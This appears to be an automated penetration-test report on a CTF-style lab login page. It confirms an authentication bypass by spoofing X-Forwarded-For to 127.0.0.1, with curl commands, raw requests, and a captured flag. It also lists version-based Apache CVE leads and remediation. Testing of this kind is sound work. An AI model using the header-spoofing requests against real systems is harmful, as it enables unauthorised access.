# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — misconfig Authentication bypass: login/flag granted when X-Forwarded-For is spoofed to 127.0.0.1 (client-header trust)](#finding-1)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [2. HIGH — vulnerable-component Outdated Apache httpd 2.4.25 — CVE-2021-40438 (mod_proxy SSRF, Critical) & CVE-2019-0211 (privesc)](#finding-2)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr1fsqpb-afzv39` |
| Target | http://target.local:32824/ |
| Started | 2026-07-01T02:08:54.810Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 3 mapped · 2 scanned · 1 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 1 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32824`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

1 finding(s): 1 high

_Plus 1 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [misconfig] Authentication bypass: login/flag granted when X-Forwarded-For is spoofed to 127.0.0.1 (client-header trust)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32824/

EFFECTIVELY AN AUTHENTICATION BYPASS (OWASP A01/A05). The AUTH 03 login handler (POST /index.php) makes its authorization decision from the attacker-controlled X-Forwarded-For request header instead of the real TCP peer. When it believes the request comes from localhost, it grants access and discloses the protected flag content — with NO valid credentials. Sending X-Forwarded-For: 127.0.0.1 fully defeats the username/password check.

Confirmed by differential test (probe_logic), identical INVALID credentials username=hacker&password=hacker in both flows, the ONLY difference being the header:
- Negative control (ev-mr1gnmfp-25): no XFF header -> HTTP 200, 3178-byte denial page; marker "flag" ABSENT.
- Positive replays (ev-mr1gnmng-26, ev-mr1gnmv6-27): same request + X-Forwarded-For: 127.0.0.1 -> HTTP 200, 3250-byte grant page containing the flag; marker "flag" PRESENT, reproduced 2/2.

Loopback-specific: X-Forwarded-For: 8.8.8.8 and target.local both return the 3178 denial; X-Real-IP: 127.0.0.1 alone does NOT bypass. The extra content appears solely for the 127.0.0.1 value and does not scale with header length, so it is a genuine loopback-gated authorization branch, not a reflected/cosmetic banner. No session cookie is set; the bypass needs only the one header.

NOTE ON TOOLING: recorded under 'misconfig' because the auth-bypass recorder is gated on verify_access, which issues a plain GET and cannot send the X-Forwarded-For header that IS the vector (it returned not_bypass for that reason). The mechanism is nonetheless a complete authentication bypass.

**Reproduction**

```
1. Baseline: curl -s -d 'username=hacker&password=hacker' http://target.local:32824/index.php -> 3178-byte page, login rejected, no flag.
2. Bypass: curl -s -H 'X-Forwarded-For: 127.0.0.1' -d 'username=hacker&password=hacker' http://target.local:32824/index.php -> 3250-byte page containing the flag; access granted despite invalid credentials.
3. Loopback-specific check: repeat step 2 with X-Forwarded-For: 8.8.8.8 or target.local -> reverts to the 3178 denial page; X-Real-IP: 127.0.0.1 (no XFF) also does not bypass.

Remediation: never derive trust or identity from X-Forwarded-For (or any client-supplied header). Resolve the true client IP only from the trusted reverse-proxy hop, and gate localhost-only functionality on the real TCP peer (REMOTE_ADDR) provided by infrastructure you control; do not treat "the request looks like it came from localhost" as authentication.
```

**Evidence**

- Evidence `ev-mr1gnmfp-25` — `artifacts/_/ev-mr1gnmfp-25/`

Request:

```http
POST /index.php HTTP/1.1
Host: target.local:32824
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

username=hacker&password=hacker
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3178
content-type: text/html; charset=UTF-8
date: Wed, 01 Jul 2026 02:32:55 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 03</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    <center><h3>Access Restricted to Internal Employees only</h3></center></body>
</html>
```

- Evidence `ev-mr1gnmng-26` — `artifacts/_/ev-mr1gnmng-26/`

Request:

```http
POST /index.php HTTP/1.1
Host: target.local:32824
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1

username=hacker&password=hacker
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3250
content-type: text/html; charset=UTF-8
date: Wed, 01 Jul 2026 02:32:55 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 03</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    <center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: flag{0860966c-999f-4fbb-8072-0187ae47abec}</h3></center></body>
</html>
```

- Evidence `ev-mr1gnmv6-27` — `artifacts/_/ev-mr1gnmv6-27/`

Request:

```http
POST /index.php HTTP/1.1
Host: target.local:32824
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1

username=hacker&password=hacker
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3250
content-type: text/html; charset=UTF-8
date: Wed, 01 Jul 2026 02:32:55 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 03</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    <center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: flag{0860966c-999f-4fbb-8072-0187ae47abec}</h3></center></body>
</html>
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-2"></a>

### 2. [SUSPECTED] [HIGH] [vulnerable-component] Outdated Apache httpd 2.4.25 — CVE-2021-40438 (mod_proxy SSRF, Critical) & CVE-2019-0211 (privesc)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32824/

**Anomaly (why this is a lead):** Apache/2.4.25 (Debian) disclosed via the Server header on the site root (and /index.php). Version ≤2.4.48 is in range for CVE-2021-40438 (mod_proxy SSRF, CVSS 9.0 → reach internal hosts / can lead to RCE) and 2.4.17–2.4.38 for CVE-2019-0211 (local root privesc); also CVE-2017-9798 Optionsbleed memory disclosure and CVE-2017-3167 auth bypass. Version-based, not exploited — the criticals are module-conditional (mod_proxy/mod_lua). NB: CVE-2021-41773/42013 path-traversal RCE does NOT apply (2.4.49/2.4.50 only).

Server banner reveals Apache httpd 2.4.25 (Debian stretch, released Dec 2016). Known High/Critical CVEs applicable by version: CVE-2021-40438 (mod_proxy SSRF, Critical 9.0, affects httpd ≤2.4.48 — server-side request forgery, exploitable class); CVE-2019-0211 (Apache scoreboard local privilege escalation to root, High, affects 2.4.17–2.4.38); CVE-2017-9798 "Optionsbleed" (use-after-free → memory/secret disclosure via OPTIONS with a Limit directive); CVE-2017-3167 (authentication bypass through ap_get_basic_auth_pw). These are version-based matches, not actively confirmed exploits, and the criticals depend on which modules are enabled (mod_proxy, mod_lua). Remediation: upgrade to a current, supported 2.4.x maintenance release. Explicitly NOT vulnerable to the CVE-2021-41773/CVE-2021-42013 path-traversal RCE, which only affects 2.4.49/2.4.50.

**Reproduction**

```
GET http://target.local:32824/ → response header `Server: Apache/2.4.25 (Debian)` (also on GET /index.php). Version compared against public CVE ranges; no active exploit attempted (module-conditional, and no safe read-only PoC applies to 2.4.25).
```

**Evidence**

- Evidence `ev-mr1grfln-2f` — `artifacts/_/ev-mr1grfln-2f/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32824
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3108
content-type: text/html; charset=UTF-8
date: Wed, 01 Jul 2026 02:35:53 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 03</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    </body>
</html>
```
